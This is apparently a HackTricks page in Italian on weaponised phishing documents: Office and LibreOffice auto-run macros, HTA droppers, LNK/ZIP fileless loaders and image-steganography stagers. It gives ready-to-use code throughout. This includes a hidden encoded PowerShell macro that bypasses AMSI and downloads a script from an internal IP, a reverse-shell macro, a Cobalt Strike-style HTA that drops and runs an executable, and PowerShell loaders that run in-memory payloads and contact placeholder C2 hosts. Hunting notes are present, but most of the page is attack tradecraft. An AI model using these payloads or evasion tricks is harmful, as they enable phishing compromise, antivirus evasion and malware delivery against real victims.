# File e documenti di Phishing

## Documenti Office

Microsoft Word esegue la convalida dei dati del file prima di aprirlo. La convalida dei dati viene eseguita sotto forma di identificazione della struttura dei dati, in conformità allo standard OfficeOpenXML. Se si verifica un errore durante l'identificazione della struttura dei dati, il file analizzato non verrà aperto.

Di solito, i file Word contenenti macro utilizzano l'estensione `.docm`. Tuttavia, è possibile rinominare il file modificandone l'estensione e mantenere comunque le funzionalità di esecuzione delle macro.\
Ad esempio, un file RTF non supporta le macro per progettazione, ma un file DOCM rinominato in RTF verrà gestito da Microsoft Word e sarà in grado di eseguire macro.\
Gli stessi componenti interni e meccanismi si applicano a tutti i software della suite Microsoft Office (Excel, PowerPoint ecc.).

È possibile utilizzare il seguente comando per verificare quali estensioni verranno eseguite da alcuni programmi Office:
```bash
assoc | findstr /i "word excel powerp"
```
I file DOCX che fanno riferimento a un template remoto (File –Options –Add-ins –Manage: Templates –Go) che include macro possono anche “eseguire” le macro.

### Caricamento di immagini esterne

Vai a: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![Documenti Office - Caricamento di immagini esterne: vai a: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Backdoor delle macro

È possibile usare le macro per eseguire codice arbitrario dal documento.

#### Funzioni di caricamento automatico

Più sono comuni, più è probabile che l'AV le rilevi.

- AutoOpen()
- Document_Open()

#### Esempi di codice delle macro
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Rimuovere manualmente i metadati

Vai a **File > Informazioni > Ispeziona documento > Ispeziona documento**, per aprire l'Inspector documenti. Fai clic su **Ispeziona** e poi su **Rimuovi tutto** accanto a **Proprietà del documento e informazioni personali**.

#### Estensione del documento

Al termine, seleziona il menu a discesa **Salva come**, cambia il formato da **`.docx`** a **Word 97-2003 `.doc`**.\
Fallo perché **non puoi salvare le macro all'interno di un `.docx`** e c'è uno **stigma** **intorno** all'estensione **`.docm`** abilitata per le macro (ad esempio, l'icona della miniatura contiene un enorme `!` e alcuni gateway web/email le bloccano completamente). Pertanto, questa **legacy `.doc` extension è il miglior compromesso**.

#### Generatori di Malicious Macros

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Macro auto-run di LibreOffice ODT (Basic)

I documenti di LibreOffice Writer possono incorporare macro Basic ed eseguirle automaticamente quando il file viene aperto associando la macro all'evento **Apri documento** (Strumenti → Personalizza → Eventi → Apri documento → Macro…).<sup>[[1]](#references)</sup> Una semplice reverse shell macro è simile a:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Nota le virgolette raddoppiate (`""`) all'interno della stringa: LibreOffice Basic le usa per eseguire l'escape delle virgolette letterali, quindi i payload che terminano con `...==""")` mantengono bilanciati sia il comando interno sia l'argomento Shell.

Suggerimenti per la distribuzione:

- Salva come `.odt` e associa la macro all'evento del documento, in modo che venga eseguita immediatamente all'apertura.
- Quando invii email con `swaks`, usa `--attach @resume.odt` (la `@` è necessaria affinché i byte del file, e non la stringa contenente il nome del file, vengano inviati come allegato). Questo è fondamentale quando si abusano server SMTP che accettano destinatari `RCPT TO` arbitrari senza eseguire la validazione.

## File HTA

Un HTA è un programma Windows che **combina HTML e linguaggi di scripting (come VBScript e JScript)**. Genera l'interfaccia utente e viene eseguito come applicazione con "piena attendibilità", senza i vincoli del modello di sicurezza di un browser.

Un HTA viene eseguito usando **`mshta.exe`**, che in genere viene **installato** insieme a **Internet Explorer**, rendendo **`mshta` dipendente da IE**. Pertanto, se quest'ultimo è stato disinstallato, gli HTA non potranno essere eseguiti.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Forzare l'autenticazione NTLM

Esistono diversi modi per **forzare l'autenticazione NTLM "da remoto"**; ad esempio, potresti aggiungere **immagini invisibili** alle email o a contenuti HTML a cui l'utente accederà (anche tramite HTTP MitM?). Oppure inviare alla vittima l'**indirizzo dei file** che **attiveranno** un'**autenticazione** semplicemente **aprendo la cartella**.

**Verifica queste idee e altre ancora nelle pagine seguenti:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Non dimenticare che non puoi soltanto rubare l'hash o l'autenticazione, ma anche **eseguire attacchi NTLM relay**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Campagne altamente efficaci distribuiscono un file ZIP contenente due documenti esca legittimi (PDF/DOCX) e un file .lnk malevolo. Il trucco consiste nel memorizzare il loader PowerShell effettivo nei raw bytes del file ZIP, dopo un marker univoco, mentre il file .lnk lo estrae e lo esegue interamente in memoria.<sup>[[2]](#references)</sup>

Flusso tipico implementato dal one-liner PowerShell del file .lnk:

1) Individua il file ZIP originale nei percorsi comuni: Desktop, Downloads, Documents, %TEMP%, %ProgramData% e nella directory padre della directory di lavoro corrente.
2) Legge i bytes del file ZIP e cerca un marker hardcoded (ad esempio, xFIQCV). Tutto ciò che segue il marker è il payload PowerShell incorporato.
3) Copia il file ZIP in %ProgramData%, lo estrae lì e apre il file .docx esca per apparire legittimo.
4) Bypassa AMSI per il processo corrente: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deobfusca lo stage successivo (ad esempio, rimuovendo tutti i caratteri #) e lo esegue in memoria.

Esempio di scheletro PowerShell per estrarre ed eseguire lo stage incorporato:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Note
- La delivery abusa spesso di sottodomini PaaS affidabili (ad es., *.herokuapp.com) e può applicare un gate ai payload (servire ZIP benigni in base a IP/UA).
- Lo stage successivo decritta frequentemente shellcode base64/XOR ed esegue tramite Reflection.Emit + VirtualAlloc per ridurre al minimo gli artefatti su disco.

Persistence utilizzata nella stessa chain
- COM TypeLib hijacking del controllo Microsoft Web Browser, in modo che IE/Explorer o qualsiasi app che lo incorpori rilanci automaticamente il payload.<sup>[[2]](#references)[[4]](#references)</sup> Vedi i dettagli e i comandi pronti all'uso qui:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- File ZIP contenenti la stringa marker ASCII (ad es., xFIQCV) aggiunta ai dati dell'archivio.
- .lnk che enumera le cartelle parent/user per individuare lo ZIP e apre un documento esca.
- Manomissione di AMSI tramite [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Thread aziendali di lunga durata che terminano con link ospitati sotto domini PaaS affidabili.

## Staging decoy-first tramite LNK → persistence con scheduled task → side-loading di CPL affidabile

Un altro pattern ricorrente è un **`.lnk` che impersona un documento** e apre immediatamente un lure benigno mentre prepara la chain reale in background.<sup>[[3]](#references)</sup>

Workflow osservato:
1. Lo shortcut **si maschera da PDF** e usa `conhost.exe` o un proxy simile per avviare un downloader PowerShell offuscato.
2. I frammenti PowerShell separano i token evidenti (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), facendo sì che le detection ingenue che cercano `iwr`, `gci`, `ren`, `cpi` o `schtasks` non rilevino il comando.
3. Lo stager scarica prima il **documento esca**, lo apre per la vittima e quindi ricostruisce i file dannosi in background.
4. I payload possono essere scritti con **estensioni junk** e poi rinominati rimuovendo i caratteri filler, ritardando la comparsa di artefatti evidenti `.exe` / `.cpl`.
5. La persistence viene stabilita con un **scheduled task basato sui minuti** che avvia un trusted host binary da un percorso scrivibile dall'utente.

Indizi minimi per l'hunting derivanti da questo pattern:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
Un layout di staging utile da riconoscere è:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` o `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Perché il secondo stage è stealthy

Nel case study di Rapid7, il scheduled task avviava ripetutamente **`Fondue.exe`** da `C:\Users\Public\`. Poiché **`APPWIZ.cpl`** era stato preparato accanto ad esso ed esportava **`RunFODW`**, il trusted Microsoft binary effettuava il side-loading del CPL dell'attaccante invece di usare la copia di sistema legittima.

Il CPL quindi:
- Legge un blob **AES-256-CBC** da `C:\Windows\Tasks\editor.dat`
- Lo decritta tramite **Windows CNG / `bcrypt.dll`**
- Alloca memoria eseguibile e copia la shellcode decrittata
- La esegue indirettamente passando il puntatore alla shellcode come callback per **`EnumUILanguagesW`**

Quest'ultimo passaggio merita di essere cercato separatamente: il malware spesso evita un salto diretto `((void(*)())buf)()` e usa invece una **legitimate callback-taking WinAPI** per trasferire l'esecuzione.

Il payload decrittato in questa campagna era una shellcode **Donut**, che mappava quindi la PE finale interamente in memoria e applicava patch a **AMSI/WLDP/ETW** nel processo corrente prima di trasferire l'esecuzione. Per note più approfondite sul side-loading e sul post-processing residente in memoria, vedi:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Pivot pratici per la ricerca:
- `.lnk` che avvia `powershell.exe` o `conhost.exe`, seguito da un documento decoy visibile.
- Download di breve durata in **`C:\Users\Public\`**, seguiti da rinominazioni immediate da estensioni senza senso.
- Scheduled task con nomi anonimi come `GoogleErrorReport` che eseguono da **directory scrivibili dall'utente**.
- Trusted binary che caricano file **`.cpl` / `.dll`** dalla stessa directory non di sistema.
- Blob di testo Base64 scritti in **`C:\Windows\Tasks\`** e successivamente letti dal modulo sottoposto a side-loading.

## Payload delimitati tramite steganografia nelle immagini (PowerShell stager)

Le catene di loader recenti distribuiscono un JavaScript/VBS offuscato che decodifica ed esegue un PowerShell stager Base64. Lo stager scarica un'immagine (spesso GIF) che contiene una DLL .NET codificata in Base64 e nascosta come testo semplice tra marker univoci di inizio/fine. Lo script cerca questi delimitatori (esempi osservati in the wild: «<<sudo_png>> … <<sudo_odt>>>»), estrae il testo intermedio, lo decodifica da Base64 in byte, carica l'assembly in memoria e invoca un metodo di ingresso noto con l'URL C2.<sup>[[5]](#references)</sup>

Flusso di lavoro
- Stage 1: dropper JS/VBS archiviato → decodifica il Base64 incorporato → avvia il PowerShell stager con -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → scarica l'immagine, estrae il Base64 delimitato dai marker, carica la DLL .NET in memoria e chiama il suo metodo (ad esempio, VAI) passando l'URL C2 e le opzioni.
- Stage 3: il loader recupera il payload finale e in genere lo inietta tramite process hollowing in un trusted binary (comunemente MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Vedi ulteriori informazioni sul process hollowing e sull'esecuzione tramite trusted utility proxy qui:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Esempio PowerShell per estrarre una DLL da un'immagine e invocare un metodo .NET in memoria:

<details>
<summary>Estrattore e loader di payload stego PowerShell</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Note
- Questo è ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> I marker variano tra le campagne.
- L'aggiramento di AMSI/ETW e la deoffuscazione delle stringhe vengono comunemente applicati prima del caricamento dell'assembly.
- Hunting: analizzare le immagini scaricate alla ricerca di delimitatori noti; identificare PowerShell che accede alle immagini e decodifica immediatamente blob Base64.

Vedi anche gli strumenti stego e le tecniche di carving:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Una fase iniziale ricorrente è costituita da un file `.js` o `.vbs` piccolo e fortemente offuscato, distribuito all'interno di un archivio. Il suo unico scopo è decodificare una stringa Base64 incorporata e avviare PowerShell con `-nop -w hidden -ep bypass` per eseguire il bootstrap della fase successiva tramite HTTPS.<sup>[[5]](#references)</sup>

Logica di base (astratta):
- Leggere il contenuto del file stesso
- Individuare un blob Base64 tra stringhe spazzatura
- Decodificare in PowerShell ASCII
- Eseguire con `wscript.exe`/`cscript.exe` invocando `powershell.exe`

Indicatori per l'hunting
- Allegati JS/VBS archiviati che avviano `powershell.exe` con `-enc`/`FromBase64String` nella riga di comando.
- `wscript.exe` che avvia `powershell.exe -nop -w hidden` da percorsi temporanei dell'utente.

## File Windows per rubare hash NTLM

Consulta la pagina sui **luoghi da cui rubare credenziali NTLM**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [1] [HTB Job – Macro LibreOffice → webshell IIS → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – Campagna ZipLine: un sofisticato attacco di phishing mirato alle aziende statunitensi](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: monitoraggio delle tecniche di Dropping Elephant attraverso una catena di loader a tema cinese](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – Nuova tecnica di persistenza COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – Il loader PhantomVAI distribuisce una serie di infostealer](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
{{#include ../../banners/hacktricks-training.md}}
